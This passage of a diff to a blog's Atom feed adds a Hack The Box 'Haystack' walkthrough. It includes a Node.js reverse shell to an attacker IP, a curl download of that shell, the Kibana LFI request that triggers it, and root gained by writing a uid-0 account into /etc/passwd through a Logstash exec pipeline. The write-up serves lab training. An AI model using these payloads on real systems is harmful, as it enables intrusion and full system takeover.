+son-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/ja
+nino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/u
+sr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstas
+h/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expres
+sions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core
+/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/
+share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.ecli
+pse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core
+/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Logstash is an open source, server-side data processing pipeline that ingests data from a multitude of sources simultaneously, transforms it, and then sends it to your favorite “stash.” -&lt;a href=&quot;https://www.elastic.co&quot;&gt;elastic.co&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;But as &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; I couldn’t read the configuration files of &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack tmp]$ cd /etc/logstash/conf.d/
+[security@haystack conf.d]$ ls -al
+total 12
+drwxrwxr-x. 2 root kibana  62 Jun 24 08:12 .
+drwxr-xr-x. 3 root root   183 Jun 18 22:15 ..
+-rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
+-rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
+-rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf
+[security@haystack conf.d]$ cat input.conf 
+cat: input.conf: Permission denied
+[security@haystack conf.d]$ cat filter.conf 
+cat: filter.conf: Permission denied
+[security@haystack conf.d]$ cat output.conf 
+cat: output.conf: Permission denied
+[security@haystack conf.d]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;As you can see, the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; can read them, so we need to be &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; and to be the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; we have to exploit the service itself.
+&lt;br /&gt;By looking at the open ports we can see that port 5601 which is the default port for &lt;a href=&quot;https://www.elastic.co/products/kibana&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;&lt;/a&gt; is open:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack conf.d]$ ss -lnt
+State       Recv-Q Send-Q                                                            Local Address:Port                                                                           Peer Address:Port               
+LISTEN      0      128                                                                           *:80                                                                                        *:*                  
+LISTEN      0      128                                                                           *:9200                                                                                      *:*                  
+LISTEN      0      128                                                                           *:22                                                                                        *:*                  
+LISTEN      0      128                                                                   127.0.0.1:5601                                                                                      *:*                  
+LISTEN      0      128                                                            ::ffff:127.0.0.1:9000                                                                                     :::*                  
+LISTEN      0      128                                                                          :::80                                                                                       :::*                  
+LISTEN      0      128                                                            ::ffff:127.0.0.1:9300                                                                                     :::*                  
+LISTEN      0      128                                                                          :::22                                                                                       :::*                  
+LISTEN      0      50                                                             ::ffff:127.0.0.1:9600                                                                                     :::*                  
+[security@haystack conf.d]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Kibana lets you visualize your Elasticsearch data and navigate the Elastic Stack so you can do anything from tracking query load to understanding the way requests flow through your apps. -&lt;a href=&quot;https://www.elastic.co/&quot;&gt;elastic.co&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;I forwarded the port:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# ssh -L 5601:127.0.0.1:5601 security@haystack.htb
+security@haystack.htb's password: 
+Last login: Fri Nov  1 15:10:02 2019 from 10.10.15.229
+[security@haystack ~]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/haystack/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I checked the version and found that it was 6.4.2:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/haystack/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;After a quick search I found that this version is vulnerable to a &lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;local file inclusion vulnerability&lt;/a&gt;.
+&lt;br /&gt;So I uploaded a &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; shell to &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack conf.d]$ cd /dev/shm/
+[security@haystack shm]$ curl http://10.10.xx.xx/shell.js &amp;gt; shell.js
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   383  100   383    0     0    382      0  0:00:01  0:00:01 --:--:--   383
+[security@haystack shm]$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell.js&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;net&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;child_process&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.xx.xx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/a/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Prevents the Node.js application form crashing&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Then I applied the POC and got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack shm]$ curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;amp;apis=../../../../../../.../../../../dev/shm/shell.js'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# nc -lvnp 1337
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.10.115.
+Ncat: Connection from 10.10.10.115:44210.
+whoami
+kibana
+which python
+/usr/bin/python
+python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+bash-4.2$ ^Z
+[1]+  Stopped                 nc -lvnp 1337
+root@kali:~/Desktop/HTB/boxes/haystack# stty raw -echo
+root@kali:~/Desktop/HTB/boxes/haystack# nc -lvnp 1337
+
+bash-4.2$
+bash-4.2$ export TERM=screen
+bash-4.2$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;exploiting-logstash-root-shell&quot;&gt;Exploiting logstash, Root Shell&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Now we can read the configuration files:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ cd /etc/logstash/conf.d/
+bash-4.2$ cat *
+filter {
+        if [type] == &quot;execute&quot; {
+                grok {
+                        match =&amp;gt; { &quot;message&quot; =&amp;gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
+                }
+        }
+}
+input {
+        file {
+                path =&amp;gt; &quot;/opt/kibana/logstash_*&quot;
+                start_position =&amp;gt; &quot;beginning&quot;
+                sincedb_path =&amp;gt; &quot;/dev/null&quot;
+                stat_interval =&amp;gt; &quot;10 second&quot;
+                type =&amp;gt; &quot;execute&quot;
+                mode =&amp;gt; &quot;read&quot;
+        }
+}
+output {
+        if [type] == &quot;execute&quot; {
+                stdout { codec =&amp;gt; json }
+                exec {
+                        command =&amp;gt; &quot;%{comando} &amp;amp;&quot;
+                }
+        }
+}
+bash-4.2$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;By reading the &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;filter&lt;/code&gt; configuration files and with the help of the &lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/pipeline.html&quot;&gt;documentation&lt;/a&gt; we will figure out what to do.
+&lt;br /&gt;We need to create an input file of the type &lt;code class=&quot;highlighter-rouge&quot;&gt;execute&lt;/code&gt; and put whatever command we need to execute in it, to create a valid &lt;code class=&quot;highlighter-rouge&quot;&gt;execute&lt;/code&gt; input file it needs to be in &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/kibana/&lt;/code&gt; and named according to the following pattern &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash_[Anything]&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;input {
+        file {
+                path =&amp;gt; &quot;/opt/kibana/logstash_*&quot;
+                ---
+                type =&amp;gt; &quot;execute&quot;
+        }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;It also needs to pass the filter, we need to put &lt;code class=&quot;highlighter-rouge&quot;&gt;Ejecutar comando :&lt;/code&gt; (translates to: &lt;code class=&quot;highlighter-rouge&quot;&gt;Execute command :&lt;/code&gt;) before the command:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;filter {
+        if [type] == &quot;execute&quot; {
+                grok {
+                        match =&amp;gt; { &quot;message&quot; =&amp;gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
+                }
+        }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I created a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;root.sh&lt;/code&gt; that echoes &lt;code class=&quot;highlighter-rouge&quot;&gt;rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; (This will make us able to &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;rooot : AAAA&lt;/code&gt;. Check &lt;a href=&quot;/hack-the-box/ghoul&quot;&gt;Ghoul&lt;/a&gt;):&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ vi /dev/shm/root.sh
+bash-4.2$ cat /dev/shm/root.sh             
+#!/bin/bash
+echo 'rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash' &amp;gt;&amp;gt; /etc/passwd
+bash-4.2$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Then I created the input file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash_pwned&lt;/code&gt;, it will simply execute &lt;code class=&quot;highlighter-rouge&quot;&gt;root.sh&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ echo 'Ejecutar comando : sh /dev/shm/root.sh' &amp;gt; /opt/kibana/logstash_pwned
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;After 2 minutes approximately the command got executed and &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; was modified:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+security:x:1000:1000:security:/home/security:/bin/bash
+elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin
+logstash:x:996:994:logstash:/usr/share/logstash:/sbin/nologin
+nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin
+kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin
+rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
+bash-4.2$ su rooot
+Contraseña:
+[root@haystack kibana]# whoami
+root
+[root@haystack kibana]# id
+uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0
+[root@haystack kibana]#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/haystack/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;And we owned root !
+&lt;br /&gt;That’s it , Feedback is appreciated !
+&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
+&lt;br /&gt;Thanks for reading.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/safe/&quot;&gt;Hack The Box - Safe&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="ssh" /><category term="steganography" /><category term="elasticsearch" /><category term="kibana" /><category term="logstash" /><category term="js" /><summary type="html">Quick Summary Hey guys, today Haystack retired and here’s my write-up about it. It was an easy fun box and I liked the privilege escalation part. It’s a Linux box and its ip is 10.10.10.115, I added it to /etc/hosts as haystack.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/haystack# nmap -sV -sT -sC -o nmapinitial haystack.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-01 17:33 EET Nmap scan report for haystack.htb (10.10.10.115) Host is up (0.59s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |http-server-header: nginx/1.12.2 |_http-title: Site doesn’t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: | Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn’t have a title (application/json; charset=UTF-8).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/haystack/0.png" /></entry><entry><title type="html">Hack The Box - Safe</title><link href="https://0xrick.github.io/hack-the-box/safe/" rel="alternate" type="text/html" title="Hack The Box - Safe" /><published>2019-10-26T00:00:00+02:00</published><updated>2019-10-26T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/safe</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/safe/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
 &lt;p&gt;&lt;br /&gt;Hey guys, today Safe retired and here’s my write-up about it. It’s a relatively easy machine with a binary exploitation challenge to get an initial shell, then for privilege escalation you have to crack a KeePass database to get root’s password and read the flag. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.147&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;safe.htb&lt;/code&gt;. Let’s jump right in !&lt;br /&gt;
@@ -419,7 +782,8 @@ root@safe:/home/user#
 &lt;br /&gt;Thanks for reading.
 &lt;br /&gt;
 &lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ellingson/&quot;&gt;Hack The Box - Ellingson&lt;/a&gt;&lt;/p&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ellingson/&quot;&gt;Hack The Box - Ellingson&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/haystack/&quot;&gt;Hack The Box - Haystack&lt;/a&gt;&lt;/p&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="ssh" /><category term="python" /><category term="binary-exploitation" /><category term="buffer-overflow" /><category term="exploit-development" /><summary type="html">Quick Summary Hey guys, today Safe retired and here’s my write-up about it. It’s a relatively easy machine with a binary exploitation challenge to get an initial shell, then for privilege escalation you have to crack a KeePass database to get root’s password and read the flag. It’s a Linux box and its ip is 10.10.10.147, I added it to /etc/hosts as safe.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/safe# nmap -sV -sT -sC -o nmapinitial safe.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-25 16:00 EET Nmap scan report for safe.htb (10.10.10.147) Host is up (0.23s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA) | 256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA) |_ 256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/safe/0.png" /></entry><entry><title type="html">Hack The Box - Ellingson</title><link href="https://0xrick.github.io/hack-the-box/ellingson/" rel="alternate" type="text/html" title="Hack The Box - Ellingson" /><published>2019-10-19T00:00:00+02:00</published><updated>2019-10-19T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/ellingson</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/ellingson/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
@@ -4918,754 +5282,4 @@ root@kali:~/Desktop/HTB/boxes/bastion#
 &lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/onetwoseven/&quot;&gt;Hack The Box - OneTwoSeven&lt;/a&gt;
 &lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/luke/&quot;&gt;Hack The Box - Luke&lt;/a&gt;
 &lt;br /&gt;Second post : &lt;a href=&quot;/hack-the-box/bastion-2/&quot;&gt;Hack The Box - Bastion (Commando)&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="windows" /><category term="web" /><category term="ssh" /><category term="smb" /><category term="windows-exploitation" /><summary type="html">Quick Summary Hey guys today Bastion retired and here’s my write-up about it. It was a nice easy box, unlike most of the other boxes this one had no web service running and unlike most of the Windows boxes it had ssh. I wrote two write-ups for this box, this one solving it with Linux (Kali), Second one solving it with Windows (CommandoVM). It’s a Windows box and its ip is 10.10.10.134, I added it to /etc/hosts as bastion.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` Nmap 7.70 scan initiated Fri Sep 6 14:12:10 2019 as: nmap -sV -sT -sC -o nmapinitial bastion.htb Nmap scan report for bastion.htb (10.10.10.134) Host is up (0.41s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/bastion/0.png" 